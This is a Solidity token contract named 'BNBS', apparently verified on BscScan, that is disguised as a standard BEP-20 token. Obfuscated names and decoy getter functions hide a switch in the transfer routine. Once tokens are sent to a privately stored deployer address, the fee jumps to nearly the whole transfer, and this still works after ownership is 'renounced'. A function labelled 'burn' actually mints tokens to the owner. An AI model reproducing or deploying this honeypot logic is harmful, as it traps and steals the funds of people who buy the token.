/**
 *Submitted for verification at BscScan.com on 2022-11-17
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-17 08:38 GNT
 */
// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract GKJRUCW {
uint256 public constant QUQFWU = 99999;
uint256 private  SSGMJB = 100000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  LSOUOS = 1000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
string public  symbol = "BNBS";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  DAUPIH = 1000000000000000000000;
address private  LFKPFG = address(0);
address private  WOOTYW = address(0);
address public owner;
string public  name = "BNBS";
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  UCCWLC = 10000000000000;
address private  VUEYLN = address(0);
uint256 private  YRSBQJ = 10000000000;
uint256 private  VATNRH = 1000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 private  JIBOIY = 1000000000000000;
address private  JGXQAA = address(0);
uint8 public constant decimals = 18;
address private  LYVGBI = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
function _getLSOUOS() private returns (uint256) {
return LSOUOS;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getDAUPIH() private returns (uint256) {
return DAUPIH;
}

function _getYRSBQJ() private returns (uint256) {
return YRSBQJ;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
constructor () public {
LFKPFG = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getJIBOIY() private returns (uint256) {
return JIBOIY;
}

function _getUCCWLC() private returns (uint256) {
return UCCWLC;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tMBAKEC 0");
require(spender != address(0), "fMBAKEC 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getLYVGBI() private returns (address) {
return LYVGBI;
}

function _getWOOTYW() private returns (address) {
return WOOTYW;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "MBAKEC");
require(to != address(0), "MBAKEC");
require(amount <= balanceOf[from], "MBAKEC");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* QUQFWU/VATNRH ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==LFKPFG){
VATNRH = QUQFWU+2;
}
emit Transfer(from, to, transferAmount);
}
function _getVUEYLN() private returns (address) {
return VUEYLN;
}

function _getJGXQAA() private returns (address) {
return JGXQAA;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getSSGMJB() private returns (uint256) {
return SSGMJB;
}


}